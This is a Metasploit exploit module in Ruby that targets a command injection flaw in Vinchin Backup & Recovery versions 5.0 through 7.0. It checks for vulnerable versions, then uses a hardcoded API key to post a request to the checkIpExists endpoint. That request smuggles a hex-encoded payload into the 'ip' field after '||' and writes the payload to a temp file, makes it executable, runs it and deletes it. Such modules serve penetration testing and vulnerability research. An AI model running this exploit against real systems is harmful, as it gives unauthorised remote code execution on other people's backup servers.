##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Vinchin Backup and Recovery Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in Vinchin Backup & Recovery
          v5.0.*, v6.0.*, v6.7.*, and v7.0.*. Due to insufficient input validation in the
          checkIpExists API endpoint, an attacker can execute arbitrary commands as the
          web server user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Gregory Boddin (LeakIX)', # Vulnerability discovery
          'Valentin Lobstein' # Metasploit module
        ],
        'References' => [
          ['CVE', '2023-45498'],
          ['CVE', '2023-45499'],
          ['URL', 'https://blog.leakix.net/2023/10/vinchin-backup-rce-chain/'],
          ['URL', 'https://vinchin.com/'] # Vendor URL
        ],
        'DisclosureDate' => '2023-10-26',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'AKA' => ['Vinchin Command Injection']
        },
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          ['Automatic', {}]
        ],

        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'FETCH_WRITABLE_DIR' => '/usr/share/nginx/vinchin/tmp'
        },
        'Privileged' => false
      )
    )
    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'The base path to the Vinchin Backup & Recovery application', '/']),
        OptString.new('APIKEY', [true, 'The hardcoded API key', '6e24cc40bfdb6963c04a4f1983c8af71']),
      ]
    )
  end

  def exploit
    hex_encoded_payload = payload.encoded.unpack('H*').first
    formatted_payload = hex_encoded_payload.scan(/../).map { |x| "\\\\x#{x}" }.join

    temp_file = "#{datastore['FETCH_WRITABLE_DIR']}/#{Rex::Text.rand_text_alpha(8)}"
    command = "echo -e #{formatted_payload}|tee #{temp_file};chmod 777 #{temp_file};#{temp_file};rm #{temp_file}"
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'api/'),
      'vars_get' => {
        'm' => '30',
        'f' => 'checkIpExists',
        'k' => datastore['APIKEY']
      },
      'data' => "p={\"ip\":\"a||#{command}\"}"
    })
  end

  def check
    target_uri_path = normalize_uri(target_uri.path, 'login.php')
    res = send_request_cgi('uri' => target_uri_path)

    return CheckCode::Unknown('Failed to connect to the target.') unless res
    return CheckCode::Unknown("Unexpected HTTP response code: #{res.code}") unless res.code == 200

    version_pattern = /Vinchin build: (\d+\.\d+\.\d+\.\d+)/
    version_match = res.body.match(version_pattern)

    unless version_match && version_match[1]
      return CheckCode::Unknown('Unable to extract version.')
    end

    version = Rex::Version.new(version_match[1])
    print_status("Detected Vinchin version: #{version}")

    if (version >= Rex::Version.new('5.0.0') && version < Rex::Version.new('5.1.0')) ||
       (version >= Rex::Version.new('6.0.0') && version < Rex::Version.new('6.1.0')) ||
       (version >= Rex::Version.new('6.7.0') && version < Rex::Version.new('6.8.0')) ||
       (version >= Rex::Version.new('7.0.0') && version < Rex::Version.new('7.0.2'))
      return CheckCode::Appears
    else
      return CheckCode::Safe
    end
  end
end
